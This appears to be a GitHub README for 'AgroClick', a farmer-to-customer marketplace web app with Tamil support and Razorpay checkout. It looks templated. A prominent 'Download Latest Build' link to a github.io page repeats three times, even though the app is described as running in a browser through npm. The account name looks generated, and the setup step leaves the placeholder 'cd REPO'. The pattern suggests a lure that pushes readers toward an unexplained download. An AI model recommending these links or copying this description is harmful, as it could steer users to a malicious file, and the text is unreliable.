# AgroClick - Farmer-to-Customer Marketplace 2026

> **AgroClick is a responsive online marketplace for connecting agricultural sellers with customers through distance-based shop discovery, English and Tamil language support, product ordering, and Razorpay payments.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/adamsryanbtvl8750/agroclick-seller-hub?style=flat-square)](https://github.com/adamsryanbtvl8750/agroclick-seller-hub)

---

<p align="center">
  <a href="https://adamsryanbtvl8750.github.io/agroclick-seller-hub/">
    <img src="https://img.shields.io/badge/Download-AgroClick%20Latest-brightgreen?style=for-the-badge" alt="Download AgroClick">
  </a>
</p>

> **[Download AgroClick Latest Build](https://adamsryanbtvl8750.github.io/agroclick-seller-hub/)**

---

[Download Latest Build](https://adamsryanbtvl8750.github.io/agroclick-seller-hub/)

---

## Product Overview

AgroClick brings farmers, agricultural shops, and customers together in a marketplace intended for Tamil Nadu and comparable local markets. Customers can find nearby stores ordered by distance, explore their product listings, place items in a cart, and pay online through Razorpay.

The seller experience includes tools for maintaining product listings, inventory, orders, and customer reviews. English and Tamil language options, responsive page layouts, OTP sign-in, seller shop setup, KYC processing, and a keyword-driven chatbot support access from mobile, tablet, and desktop devices.

---

## What AgroClick Provides

- Find agricultural shops using location and distance
- Build a cart and place product orders online
- Pay with Razorpay using UPI, cards, or netbanking
- Maintain products, stock, orders, and reviews through the seller dashboard
- Use the application in either English or Tamil
- Access accounts with OTP-based authentication
- Complete KYC and set up a seller shop
- Ask for keyword-based help through the integrated chatbot
- Work with layouts designed for mobile, tablet, and desktop screens
- Keep browser-side application data in a LocalStorage data layer

---

## Set Up Locally

First clone the repository and enter its directory:

```bash
git clone https://github.com/adamsryanbtvl8750/agroclick-seller-hub.git
cd REPO
```

Install the required Node.js packages:

```bash
npm install
```

Run the web application with the project's configured start command:

```bash
npm start
```

Visit the local URL printed in the terminal. You can then register or use OTP sign-in to try the customer and seller experiences.

---

## Using the Marketplace

### Customer journey

1. Launch AgroClick in a modern browser.
2. Set the interface language to English or Tamil.
3. Authenticate with an OTP.
4. Explore nearby shops in distance order.
5. Add selected products to the shopping cart.
6. Proceed to Razorpay checkout and select UPI, card, or netbanking.
7. Check the order details once payment is complete.

### Seller journey

1. Log in to AgroClick.
2. Finish the KYC steps.
3. Create and set up a shop.
4. Add products and maintain their available stock.
5. Track orders received from customers.
6. Manage customer reviews in the seller dashboard.

---

## Data and Configuration

AgroClick stores browser-side application data through LocalStorage. During local testing, continue using the same browser profile if you want previously stored marketplace state to remain available.

Configure payment behavior and other application settings based on the project setup and deployment environment. Private service credentials should not be exposed in client-side files or committed to the repository.

---

## Requirements

- A current web browser
- Node.js and npm for development on a local machine
- Network connectivity for hosted services and Razorpay checkout
- A device with a mobile, tablet, or desktop-sized display
- LocalStorage enabled in the browser

---

## Frequently Asked Questions

### What kind of users is AgroClick designed for?

It serves customers who want to purchase agricultural products and sellers who need to operate a shop within a farm marketplace.

### Can I use the interface in Tamil?

Yes. AgroClick offers both English and Tamil interfaces.

### Which payment methods are supported?

Razorpay handles online payments through UPI, cards, and netbanking.

### What can sellers do from the dashboard?

After completing the applicable shop setup and KYC flows, sellers can manage products, inventory, orders, and reviews.

### Where does the application keep local data?

The browser-side data layer relies on LocalStorage. Removing browser storage may delete data retained locally by the application.

### What steps should I take if startup fails?

Verify that Node.js and npm are available, execute `npm install`, and start the project with its configured command. For continued problems, review both the terminal output and browser console for dependency or configuration errors.

### How do I get the newest version?

Follow the latest build link above, or pull the most recent repository changes and reinstall dependencies.

---

## License

AgroClick is released under GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the full license details.
